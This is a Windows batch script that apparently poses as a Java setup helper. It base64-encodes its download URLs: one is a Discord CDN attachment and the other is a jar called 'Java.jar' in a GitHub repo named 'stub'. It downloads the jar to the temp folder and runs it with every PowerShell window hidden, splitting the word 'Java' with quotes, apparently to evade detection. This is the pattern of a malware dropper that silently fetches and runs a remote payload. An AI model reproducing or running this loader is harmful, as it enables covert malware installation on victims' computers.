@echo off

java -version >nul 2>&1
if %errorLevel% NEQ 0 (
    goto :install_java
) else (
    goto :download_and_run_jar
)

:install_java
set "encodedUrl=aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI5MDQyNjM5MTM5MjY4NjA4MC8xMjkzNjMzMTg5Mjg5Mzk0MTk2L2pyZTEuOC4wXzM2MS56aXA/ZXg9NjcwODE1NGEmaXM9NjcwNmMzY2EmaG09Yzg1YWY3YTlkMWI1MjJjYzhkNjgwYWViN2ZmYzUyMDRmNjExMGI1MDA1OGJiYTJiNDJmMDY3OWY1NGY0ZjBlNw=="
set "output=%TEMP%\jre1.8.0_361.zip"
set "installDir=%USERPROFILE%\Ja"v"a\jre1.8.0_361"

powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedUrl%')); (New-Object System.Net.WebClient).DownloadFile($url, '%output%')"

powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"

if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
    del "%output%"
) else (
    exit /b 1
)

set PATH=%PATH%;%installDir%\jre1.8.0_361\bin

:download_and_run_jar
set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL2hlYWRzL21haW4vSmF2YS5qYXI="
set "jarOutput=%TEMP%\Ja"v"a.jar"

powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"

if exist "%jarOutput%" (
    powershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
)

exit
